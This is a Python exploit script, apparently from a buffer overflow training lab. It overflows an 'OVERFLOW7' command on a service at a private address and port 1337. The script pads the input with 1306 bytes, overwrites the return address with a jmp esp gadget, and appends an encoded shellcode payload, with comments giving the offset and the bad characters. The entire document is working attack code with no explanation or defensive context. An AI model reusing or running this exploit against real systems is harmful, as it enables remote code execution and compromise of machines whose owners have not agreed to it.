#!/usr/bin/python3

import socket, sys

host = '10.10.80.122'
port = 1337


# [*] Exact match at offset 1306
# Badchars: 00 8c 8d ae af be bf fb fc
# Removed chars: 00 8c ae be fb
# jmp esp memory address: 0x625011f7

buf =  b""
buf += b"\x31\xc9\x83\xe9\xaf\xe8\xff\xff\xff\xff\xc0\x5e\x81"
buf += b"\x76\x0e\xb5\x1e\x47\x15\x83\xee\xfc\xe2\xf4\x49\xf6"
buf += b"\xc5\x15\xb5\x1e\x27\x9c\x50\x2f\x87\x71\x3e\x4e\x77"
buf += b"\x9e\xe7\x12\xcc\x47\xa1\x95\x35\x3d\xba\xa9\x0d\x33"
buf += b"\x84\xe1\xeb\x29\xd4\x62\x45\x39\x95\xdf\x88\x18\xb4"
buf += b"\xd9\xa5\xe7\xe7\x49\xcc\x47\xa5\x95\x0d\x29\x3e\x52"
buf += b"\x56\x6d\x56\x56\x46\xc4\xe4\x95\x1e\x35\xb4\xcd\xcc"
buf += b"\x5c\xad\xfd\x7d\x5c\x3e\x2a\xcc\x14\x63\x2f\xb8\xb9"
buf += b"\x74\xd1\x4a\x14\x72\x26\xa7\x60\x43\x1d\x3a\xed\x8e"
buf += b"\x63\x63\x60\x51\x46\xcc\x4d\x91\x1f\x94\x73\x3e\x12"
buf += b"\x0c\x9e\xed\x02\x46\xc6\x3e\x1a\xcc\x14\x65\x97\x03"
buf += b"\x31\x91\x45\x1c\x74\xec\x44\x16\xea\x55\x41\x18\x4f"
buf += b"\x3e\x0c\xac\x98\xe8\x76\x74\x27\xb5\x1e\x2f\x62\xc6"
buf += b"\x2c\x18\x41\xdd\x52\x30\x33\xb2\xe1\x92\xad\x25\x1f"
buf += b"\x47\x15\x9c\xda\x13\x45\xdd\x37\xc7\x7e\xb5\xe1\x92"
buf += b"\x45\xe5\x4e\x17\x55\xe5\x5e\x17\x7d\x5f\x11\x98\xf5"
buf += b"\x4a\xcb\xd0\x7f\xb0\x76\x4d\x1e\xa6\x47\x2f\x17\xb5"
buf += b"\x1e\x17\x9c\x53\x74\x57\x43\xe2\x76\xde\xb0\xc1\x7f"
buf += b"\xb8\xc0\x30\xde\x33\x19\x4a\x50\x4f\x60\x59\x76\xb7"
buf += b"\xa0\x17\x48\xb8\xc0\xdd\x7d\x2a\x71\xb5\x97\xa4\x42"
buf += b"\xe2\x49\x76\xe3\xdf\x0c\x1e\x43\x57\xe3\x21\xd2\xf1"
buf += b"\x3a\x7b\x14\xb4\x93\x03\x31\xa5\xd8\x47\x51\xe1\x4e"
buf += b"\x11\x43\xe3\x58\x11\x5b\xe3\x48\x14\x43\xdd\x67\x8b"
buf += b"\x2a\x33\xe1\x92\x9c\x55\x50\x11\x53\x4a\x2e\x2f\x1d"
buf += b"\x32\x03\x27\xea\x60\xa5\xa7\x08\x9f\x14\x2f\xb3\x20"
buf += b"\xa3\xda\xea\x60\x22\x41\x69\xbf\x9e\xbc\xf5\xc0\x1b"
buf += b"\xfc\x52\xa6\x6c\x28\x7f\xb5\x4d\xb8\xc0"

payload = buf

shellcode = b'A' * 1306 + b'\xf7\x11\x50\x62' + payload

def exploit():
	
	try:
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.connect((host, port))

		s.send(b'OVERFLOW7 ' + shellcode)
		s.close()

	except:
		raise Exception('Unable to connect to server %s:%s' % (host, port))
		sys.exit()



if __name__ == '__main__':
	exploit()
